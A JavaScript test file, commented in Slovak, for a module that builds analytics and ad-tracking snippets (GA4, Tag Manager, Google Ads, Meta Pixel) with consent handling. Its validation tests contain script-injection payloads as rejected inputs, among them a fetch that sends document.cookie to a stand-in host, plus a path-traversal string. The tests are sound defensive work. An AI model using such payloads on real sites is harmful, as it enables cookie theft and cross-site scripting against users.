import { describe, it, expect } from "vitest";
import {
  googleAktualizacia,
  googleKonfig,
  googleZaklad,
  gtagUrl,
  gtmSkript,
  kodNakupu,
  maCoMerat,
  metaSkript,
  overId,
  overMerania,
} from "./kody";
import { googleConsent, precitajSuhlas, zapisSuhlas, VSETKO_NIE } from "./suhlas";

const PLATNE = {
  ga4: "G-ABCD123456",
  gtm: "GTM-ABC1234",
  googleAds: "AW-123456789",
  konverznaNavestie: "abcDEF_ghIJ",
  metaPixel: "123456789012345",
};

describe("overenie identifikátorov", () => {
  it("prijme správne tvary", () => {
    expect(overId("ga4", PLATNE.ga4)).toBe(PLATNE.ga4);
    expect(overId("gtm", PLATNE.gtm)).toBe(PLATNE.gtm);
    expect(overId("googleAds", PLATNE.googleAds)).toBe(PLATNE.googleAds);
    expect(overId("metaPixel", PLATNE.metaPixel)).toBe(PLATNE.metaPixel);
  });

  it("obstrihne medzery", () => {
    expect(overId("ga4", "  G-ABCD123456 ")).toBe(PLATNE.ga4);
  });

  it("prázdne je null", () => {
    expect(overId("ga4", "")).toBeNull();
    expect(overId("ga4", null)).toBeNull();
    expect(overId("ga4", "   ")).toBeNull();
  });

  it("zlý tvar zahodí, neopraví", () => {
    expect(overId("ga4", "UA-12345-1")).toBeNull();
    expect(overId("googleAds", "AW-12")).toBeNull();
    expect(overId("gtm", "GTM")).toBeNull();
    expect(overId("metaPixel", "abc")).toBeNull();
  });

  // Toto je dôvod, prečo tu kontrola je.
  it("pokus o vloženie vlastného skriptu neprejde", () => {
    const utok = 'G-X");alert(document.cookie);("';
    expect(overId("ga4", utok)).toBeNull();
    expect(overId("metaPixel", "1);fetch('//zly.sk?c='+document.cookie);(1")).toBeNull();
    expect(overId("gtm", "GTM-A</script><script>alert(1)</script>")).toBeNull();
    expect(overId("konverznaNavestie", "ab/../../etc")).toBeNull();
  });

  it("overMerania prepustí len to platné", () => {
    const o = overMerania({ ...PLATNE, ga4: "nezmysel", metaPixel: "<script>" });
    expect(o.ga4).toBeNull();
    expect(o.metaPixel).toBeNull();
    expect(o.gtm).toBe(PLATNE.gtm);
  });

  it("maCoMerat pozná prázdne nastavenie", () => {
    expect(maCoMerat({})).toBe(false);
    expect(maCoMerat({ ga4: "nezmysel" })).toBe(false);
    expect(maCoMerat({ ga4: PLATNE.ga4 })).toBe(true);
  });
});

describe("Google Consent Mode", () => {
  it("úvodný skript nastaví predvolby a čaká na rozhodnutie", () => {
    const s = googleZaklad(googleConsent(null));
    expect(s).toContain("gtag('consent','default'");
    expect(s).toContain('ad_storage:"denied"');
    expect(s).toContain('analytics_storage:"denied"');
    expect(s).toContain("wait_for_update:500");
  });

  it("aktualizácia pošle nový stav", () => {
    const s = googleAktualizacia(
      googleConsent(precitajSuhlas(zapisSuhlas({ analytika: true, marketing: false }))),
    );
    expect(s).toContain("gtag('consent','update'");
    expect(s).toContain('"analytics_storage":"granted"');
    expect(s).toContain('"ad_storage":"denied"');
  });

  it("adresa gtag.js je na Google a ID je zakódované", () => {
    expect(gtagUrl(PLATNE.ga4)).toBe("https://www.googletagmanager.com/gtag/js?id=G-ABCD123456");
  });
});

describe("spúšťacie skripty", () => {
  it("konfigurácia spustí GA4 aj Ads", () => {
    const s = googleKonfig(PLATNE);
    expect(s).toContain(`gtag('config',"${PLATNE.ga4}")`);
    expect(s).toContain(`gtag('config',"${PLATNE.googleAds}")`);
  });

  it("bez platných ID nespustí nič navyše", () => {
    expect(googleKonfig({})).toBe("gtag('js',new Date());");
  });

  it("GTM aj Meta sa poskladajú len s platným ID", () => {
    expect(gtmSkript(PLATNE.gtm)).toContain(`'dataLayer',"${PLATNE.gtm}"`);
    expect(gtmSkript("GTM")).toBe("");
    expect(metaSkript(PLATNE.metaPixel)).toContain(`fbq('init',"${PLATNE.metaPixel}")`);
    expect(metaSkript("x")).toBe("");
  });

  it("Meta posiela PageView hneď po inicializácii", () => {
    expect(metaSkript(PLATNE.metaPixel)).toContain("fbq('track','PageView')");
  });
});

describe("konverzia nákupu", () => {
  const n = { objednavka: "2026001234", suma: 45.9 };

  it("pošle GA4 purchase s číslom objednávky", () => {
    const s = kodNakupu(PLATNE, n);
    expect(s).toContain("'purchase'");
    expect(s).toContain('transaction_id:"2026001234"');
    expect(s).toContain("value:45.9");
    expect(s).toContain('currency:"EUR"');
  });

  it("Google Ads konverzia nesie ID aj návestie", () => {
    expect(kodNakupu(PLATNE, n)).toContain('send_to:"AW-123456789/abcDEF_ghIJ"');
  });

  it("bez návestia sa konverzia Ads nepošle — zapísala by sa do nesprávnej akcie", () => {
    const s = kodNakupu({ ...PLATNE, konverznaNavestie: null }, n);
    expect(s).not.toContain("'conversion'");
    expect(s).toContain("'purchase'");
  });

  it("Meta dostane eventID, aby sa obnovenie stránky nepočítalo dvakrát", () => {
    expect(kodNakupu(PLATNE, n)).toContain('{eventID:"2026001234"}');
  });

  it("Meta sa volá len keď fbq existuje", () => {
    expect(kodNakupu(PLATNE, n)).toContain("if(window.fbq)");
  });

  it("suma sa zaokrúhli na centy a mena je veľkými", () => {
    const s = kodNakupu(PLATNE, { objednavka: "1", suma: 19.999, mena: "eur" });
    expect(s).toContain("value:20");
    expect(s).toContain('currency:"EUR"');
  });

  it("bez nastavení nevznikne nič", () => {
    expect(kodNakupu({}, n)).toBe("");
  });

  it("číslo objednávky je vložené ako reťazec, nie zlepené", () => {
    // Keby sa objednávka vkladala bez JSON.stringify, apostrof by rozbil skript.
    const s = kodNakupu(PLATNE, { objednavka: `a"';alert(1);//`, suma: 1 });
    expect(s).toContain(String.raw`"a\"';alert(1);//"`);
  });

  it("odmietnutý marketing nie je úloha tohto modulu, ale súhlasu", () => {
    // Kontrola, že sme si nezmiešali zodpovednosti: kód sa poskladá vždy,
    // o tom, či sa spustí, rozhoduje `smieSa` na strane volajúceho.
    expect(googleConsent(precitajSuhlas(zapisSuhlas(VSETKO_NIE))).ad_storage).toBe("denied");
  });
});
